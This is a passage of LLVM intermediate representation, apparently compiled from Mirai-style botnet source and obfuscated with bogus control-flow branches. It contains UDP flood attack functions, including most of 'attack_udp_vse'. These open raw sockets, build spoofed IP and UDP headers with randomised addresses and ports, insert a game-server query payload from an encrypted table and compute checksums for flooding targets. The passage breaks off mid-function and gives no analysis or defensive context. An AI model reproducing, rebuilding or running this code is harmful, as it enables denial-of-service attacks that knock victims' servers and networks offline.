  %538 = alloca i8, align 1
  %539 = alloca i32, align 4
  %540 = alloca i32, align 4
  %541 = alloca %struct.iphdr*, align 8
  %542 = alloca %struct.udphdr*, align 8
  %543 = alloca i8*, align 8
  %544 = alloca %struct.iphdr*, align 8
  %545 = alloca %struct.udphdr*, align 8
  %546 = alloca i8*, align 8
  %547 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %523, align 4
  store i8 %1, i8* %524, align 1
  store %struct.attack_target* %2, %struct.attack_target** %525, align 8
  store i8 %3, i8* %526, align 1
  store %struct.attack_option* %4, %struct.attack_option** %527, align 8
  store i32 0, i32* %528, align 4
  store i32 0, i32* %529, align 4
  %548 = load i8, i8* %524, align 1
  %549 = zext i8 %548 to i64
  %550 = call noalias i8* @calloc(i64 %549, i64 8) #6
  %551 = bitcast i8* %550 to i8**
  store i8** %551, i8*** %530, align 8
  %552 = load i8, i8* %526, align 1
  %553 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %554 = call i32 @attack_get_opt_int(i8 zeroext %552, %struct.attack_option* %553, i8 zeroext 2, i32 0)
  %555 = trunc i32 %554 to i8
  store i8 %555, i8* %531, align 1
  %556 = load i8, i8* %526, align 1
  %557 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %558 = call i32 @attack_get_opt_int(i8 zeroext %556, %struct.attack_option* %557, i8 zeroext 3, i32 65535)
  %559 = trunc i32 %558 to i16
  store i16 %559, i16* %532, align 2
  %560 = load i8, i8* %526, align 1
  %561 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %562 = call i32 @attack_get_opt_int(i8 zeroext %560, %struct.attack_option* %561, i8 zeroext 4, i32 64)
  %563 = trunc i32 %562 to i8
  store i8 %563, i8* %533, align 1
  %564 = load i8, i8* %526, align 1
  %565 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %566 = call i32 @attack_get_opt_int(i8 zeroext %564, %struct.attack_option* %565, i8 zeroext 5, i32 0)
  %567 = trunc i32 %566 to i8
  store i8 %567, i8* %534, align 1
  %568 = load i8, i8* %526, align 1
  %569 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %570 = call i32 @attack_get_opt_int(i8 zeroext %568, %struct.attack_option* %569, i8 zeroext 6, i32 65535)
  %571 = trunc i32 %570 to i16
  store i16 %571, i16* %535, align 2
  %572 = load i8, i8* %526, align 1
  %573 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %574 = call i32 @attack_get_opt_int(i8 zeroext %572, %struct.attack_option* %573, i8 zeroext 7, i32 65535)
  %575 = trunc i32 %574 to i16
  store i16 %575, i16* %536, align 2
  %576 = load i8, i8* %526, align 1
  %577 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %578 = call i32 @attack_get_opt_int(i8 zeroext %576, %struct.attack_option* %577, i8 zeroext 0, i32 512)
  %579 = trunc i32 %578 to i16
  store i16 %579, i16* %537, align 2
  %580 = load i8, i8* %526, align 1
  %581 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %582 = call i32 @attack_get_opt_int(i8 zeroext %580, %struct.attack_option* %581, i8 zeroext 1, i32 1)
  %583 = trunc i32 %582 to i8
  store i8 %583, i8* %538, align 1
  %584 = load i8, i8* %526, align 1
  %585 = load %struct.attack_option*, %struct.attack_option** %527, align 8
  %586 = load i32, i32* @LOCAL_ADDR, align 4
  %587 = call i32 @attack_get_opt_int(i8 zeroext %584, %struct.attack_option* %585, i8 zeroext 19, i32 %586)
  store i32 %587, i32* %539, align 4
  %588 = call i64 @time(i64* null) #6
  %589 = load i32, i32* %523, align 4
  %590 = sext i32 %589 to i64
  %_ = shl i64 %588, %590
  %_1 = sub i64 %588, %590
  %gen = mul i64 %_1, %590
  %_2 = sub i64 0, %588
  %gen3 = add i64 %_2, %590
  %591 = add nsw i64 %588, %590
  %592 = trunc i64 %591 to i32
  store i32 %592, i32* %540, align 4
  %593 = load i16, i16* %537, align 2
  %594 = zext i16 %593 to i32
  %595 = icmp sgt i32 %594, 1460
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %96
  %596 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %596, i32* %20, align 4
  %597 = icmp eq i32 %596, -1
  br label %originalBB4

originalBB8alteredBB:                             ; preds = %originalBB8, %121
  %598 = load i32, i32* %20, align 4
  %599 = call i32 @close(i32 %598)
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %141
  %600 = load i32, i32* %19, align 4
  %601 = load i8, i8* %15, align 1
  %602 = zext i8 %601 to i32
  %603 = icmp slt i32 %600, %602
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %239
  %604 = load i32, i32* %19, align 4
  %_17 = sub i32 %604, 1
  %gen18 = mul i32 %_17, 1
  %605 = add nsw i32 %604, 1
  store i32 %605, i32* %19, align 4
  br label %originalBB16

originalBB22alteredBB:                            ; preds = %originalBB22, %258
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %303
  %606 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %607 = load i32, i32* %19, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %606, i64 %608
  %610 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %609, i32 0, i32 1
  %611 = load i32, i32* %610, align 4
  %612 = call i32 @ntohl(i32 %611) #7
  %613 = call i32 @rand_next()
  %614 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %615 = load i32, i32* %19, align 4
  %616 = sext i32 %615 to i64
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %614, i64 %616
  %618 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %617, i32 0, i32 2
  %619 = load i8, i8* %618, align 4
  %620 = zext i8 %619 to i32
  %_27 = sub i32 0, %613
  %gen28 = add i32 %_27, %620
  %_29 = sub i32 0, %613
  %gen30 = add i32 %_29, %620
  %_31 = shl i32 %613, %620
  %_32 = sub i32 0, %613
  %gen33 = add i32 %_32, %620
  %_34 = sub i32 %613, %620
  %gen35 = mul i32 %_34, %620
  %621 = lshr i32 %613, %620
  %_36 = shl i32 %612, %621
  %_37 = shl i32 %612, %621
  %_38 = shl i32 %612, %621
  %622 = add i32 %612, %621
  %623 = call i32 @htonl(i32 %622) #7
  %624 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %625 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %624, i32 0, i32 9
  store i32 %623, i32* %625, align 4
  br label %originalBB26

originalBB42alteredBB:                            ; preds = %originalBB42, %343
  %626 = call i32 @rand_next()
  %627 = load %struct.iphdr*, %struct.iphdr** %35, align 8
  %628 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %627, i32 0, i32 8
  store i32 %626, i32* %628, align 4
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %363
  %629 = load i16, i16* %23, align 2
  %630 = zext i16 %629 to i32
  %631 = icmp eq i32 %630, 65535
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %388
  %632 = load i16, i16* %26, align 2
  %633 = zext i16 %632 to i32
  %634 = icmp eq i32 %633, 65535
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %417
  %635 = call i32 @rand_next()
  %636 = trunc i32 %635 to i16
  %637 = load %struct.udphdr*, %struct.udphdr** %36, align 8
  %638 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %637, i32 0, i32 1
  store i16 %636, i16* %638, align 2
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %506
  br label %originalBB58
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_vse(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.iphdr*, align 8
  %24 = alloca %struct.udphdr*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 8) #6
  %33 = bitcast i8* %32 to i8**
  store i8** %33, i8*** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 2, i32 0)
  %37 = trunc i32 %36 to i8
  store i8 %37, i8* %14, align 1
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 3, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 4, i32 64)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %16, align 1
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 5, i32 0)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = load i8, i8* %9, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 6, i32 65535)
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %18, align 2
  %54 = load i8, i8* %9, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 7, i32 27015)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %19, align 2
  store i32 0, i32* %21, align 4
  %58 = call i64 @time(i64* null) #6
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = add nsw i64 %58, %60
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %22, align 4
  call void @table_unlock_val(i8 zeroext 40)
  %63 = call i8* @table_retrieve_val(i32 40, i32* %21)
  store i8* %63, i8** %20, align 8
  %64 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %64, i32* %12, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %83

; <label>:66:                                     ; preds = %5
  %67 = load i32, i32* @x.27
  %68 = load i32, i32* @y.28
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %66
  %75 = load i32, i32* @x.27
  %76 = load i32, i32* @y.28
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %414

; <label>:83:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %84 = load i32, i32* %12, align 4
  %85 = bitcast i32* %11 to i8*
  %86 = call i32 @setsockopt(i32 %84, i32 0, i32 3, i8* %85, i32 4) #6
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %107

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* @x.27
  %90 = load i32, i32* @y.28
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %88
  %97 = load i32, i32* %12, align 4
  %98 = call i32 @close(i32 %97)
  %99 = load i32, i32* @x.27
  %100 = load i32, i32* @y.28
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %414

; <label>:107:                                    ; preds = %83
  store i32 0, i32* %11, align 4
  br label %108

; <label>:108:                                    ; preds = %216, %107
  %109 = load i32, i32* %11, align 4
  %110 = load i8, i8* %7, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %219

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %23, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.udphdr*
  store %struct.udphdr* %127, %struct.udphdr** %24, align 8
  %128 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %129 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %128, i64 1
  %130 = bitcast %struct.udphdr* %129 to i8*
  store i8* %130, i8** %25, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = and i8 %133, 15
  %135 = or i8 %134, 64
  store i8 %135, i8* %132, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, -16
  %140 = or i8 %139, 5
  store i8 %140, i8* %137, align 4
  %141 = load i8, i8* %14, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = load i32, i32* %21, align 4
  %145 = sext i32 %144 to i64
  %146 = add i64 32, %145
  %147 = trunc i64 %146 to i16
  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 2
  store i16 %148, i16* %150, align 2
  %151 = load i16, i16* %15, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i8, i8* %16, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 5
  store i8 %155, i8* %157, align 4
  %158 = load i8, i8* %17, align 1
  %159 = icmp ne i8 %158, 0
  br i1 %159, label %160, label %180

; <label>:160:                                    ; preds = %113
  %161 = load i32, i32* @x.27
  %162 = load i32, i32* @y.28
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %160
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  %172 = load i32, i32* @x.27
  %173 = load i32, i32* @y.28
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %180

; <label>:180:                                    ; preds = %originalBBpart28, %113
  %181 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 6
  store i8 17, i8* %182, align 1
  %183 = load i32, i32* @LOCAL_ADDR, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 8
  store i32 %183, i32* %185, align 4
  %186 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %187 = load i32, i32* %11, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 1
  %191 = load i32, i32* %190, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 9
  store i32 %191, i32* %193, align 4
  %194 = load i16, i16* %18, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %19, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = load i32, i32* %21, align 4
  %203 = sext i32 %202 to i64
  %204 = add i64 12, %203
  %205 = trunc i64 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 2
  store i16 %206, i16* %208, align 2
  %209 = load i8*, i8** %25, align 8
  %210 = bitcast i8* %209 to i32*
  store i32 -1, i32* %210, align 4
  %211 = load i8*, i8** %25, align 8
  %212 = getelementptr inbounds i8, i8* %211, i64 4
  store i8* %212, i8** %25, align 8
  %213 = load i8*, i8** %25, align 8
  %214 = load i8*, i8** %20, align 8
  %215 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %213, i8* %214, i32 %215)
  br label %216

; <label>:216:                                    ; preds = %180
  %217 = load i32, i32* %11, align 4
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %11, align 4
  br label %108

; <label>:219:                                    ; preds = %108
  %220 = load i32, i32* @x.27
  %221 = load i32, i32* @y.28
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %219
  %228 = load i32, i32* @x.27
  %229 = load i32, i32* @y.28
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %236

; <label>:236:                                    ; preds = %413, %originalBBpart212
  %237 = load i32, i32* @x.27
  %238 = load i32, i32* @y.28
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %236
  store i32 0, i32* %11, align 4
  %245 = load i32, i32* @x.27
  %246 = load i32, i32* @y.28
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %253

; <label>:253:                                    ; preds = %404, %originalBBpart216
  %254 = load i32, i32* %11, align 4
  %255 = load i8, i8* %7, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp slt i32 %254, %256
  br i1 %257, label %258, label %407

; <label>:258:                                    ; preds = %253
  %259 = load i8**, i8*** %13, align 8
  %260 = load i32, i32* %11, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds i8*, i8** %259, i64 %261
  %263 = load i8*, i8** %262, align 8
  store i8* %263, i8** %26, align 8
  %264 = load i8*, i8** %26, align 8
  %265 = bitcast i8* %264 to %struct.iphdr*
  store %struct.iphdr* %265, %struct.iphdr** %27, align 8
  %266 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i64 1
  %268 = bitcast %struct.iphdr* %267 to %struct.udphdr*
  store %struct.udphdr* %268, %struct.udphdr** %28, align 8
  %269 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %270 = load i32, i32* %11, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %269, i64 %271
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i32 0, i32 2
  %274 = load i8, i8* %273, align 4
  %275 = zext i8 %274 to i32
  %276 = icmp slt i32 %275, 32
  br i1 %276, label %277, label %314

; <label>:277:                                    ; preds = %258
  %278 = load i32, i32* @x.27
  %279 = load i32, i32* @y.28
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %277
  %286 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %287 = load i32, i32* %11, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %286, i64 %288
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i32 0, i32 1
  %291 = load i32, i32* %290, align 4
  %292 = call i32 @ntohl(i32 %291) #7
  %293 = call i32 @rand_next()
  %294 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %295 = load i32, i32* %11, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %294, i64 %296
  %298 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %297, i32 0, i32 2
  %299 = load i8, i8* %298, align 4
  %300 = zext i8 %299 to i32
  %301 = lshr i32 %293, %300
  %302 = add i32 %292, %301
  %303 = call i32 @htonl(i32 %302) #7
  %304 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 9
  store i32 %303, i32* %305, align 4
  %306 = load i32, i32* @x.27
  %307 = load i32, i32* @y.28
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBBpart234, label %originalBB18alteredBB

originalBBpart234:                                ; preds = %originalBB18
  br label %314

; <label>:314:                                    ; preds = %originalBBpart234, %258
  %315 = load i32, i32* @x.27
  %316 = load i32, i32* @y.28
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %314
  %323 = load i16, i16* %15, align 2
  %324 = zext i16 %323 to i32
  %325 = icmp eq i32 %324, 65535
  %326 = load i32, i32* @x.27
  %327 = load i32, i32* @y.28
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %325, label %334, label %339

; <label>:334:                                    ; preds = %originalBBpart238
  %335 = call i32 @rand_next()
  %336 = trunc i32 %335 to i16
  %337 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i32 0, i32 3
  store i16 %336, i16* %338, align 4
  br label %339

; <label>:339:                                    ; preds = %334, %originalBBpart238
  %340 = load i16, i16* %18, align 2
  %341 = zext i16 %340 to i32
  %342 = icmp eq i32 %341, 65535
  br i1 %342, label %343, label %348

; <label>:343:                                    ; preds = %339
  %344 = call i32 @rand_next()
  %345 = trunc i32 %344 to i16
  %346 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %347 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %346, i32 0, i32 0
  store i16 %345, i16* %347, align 2
  br label %348

; <label>:348:                                    ; preds = %343, %339
  %349 = load i16, i16* %19, align 2
  %350 = zext i16 %349 to i32
  %351 = icmp eq i32 %350, 65535
  br i1 %351, label %352, label %357

; <label>:352:                                    ; preds = %348
  %353 = call i32 @rand_next()
  %354 = trunc i32 %353 to i16
  %355 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %356 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %355, i32 0, i32 1
  store i16 %354, i16* %356, align 2
  br label %357

; <label>:357:                                    ; preds = %352, %348
  %358 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 7
  store i16 0, i16* %359, align 2
  %360 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %361 = bitcast %struct.iphdr* %360 to i16*
  %362 = call zeroext i16 @checksum_generic(i16* %361, i32 20)
  %363 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 7
  store i16 %362, i16* %364, align 2
  %365 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %366 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %365, i32 0, i32 3
  store i16 0, i16* %366, align 2
  %367 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %368 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %369 = bitcast %struct.udphdr* %368 to i8*
  %370 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i32 0, i32 2
  %372 = load i16, i16* %371, align 2
  %373 = load i32, i32* %21, align 4
  %374 = sext i32 %373 to i64
  %375 = add i64 12, %374
  %376 = trunc i64 %375 to i32
  %377 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %367, i8* %369, i16 zeroext %372, i32 %376)
  %378 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %379 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %378, i32 0, i32 3
  store i16 %377, i16* %379, align 2
  %380 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %381 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %380, i32 0, i32 1
  %382 = load i16, i16* %381, align 2
  %383 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %384 = load i32, i32* %11, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %386, i32 0, i32 0
  %388 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %387, i32 0, i32 1
  store i16 %382, i16* %388, align 2
  %389 = load i32, i32* %12, align 4
  %390 = load i8*, i8** %26, align 8
  %391 = load i32, i32* %21, align 4
  %392 = sext i32 %391 to i64
  %393 = add i64 32, %392
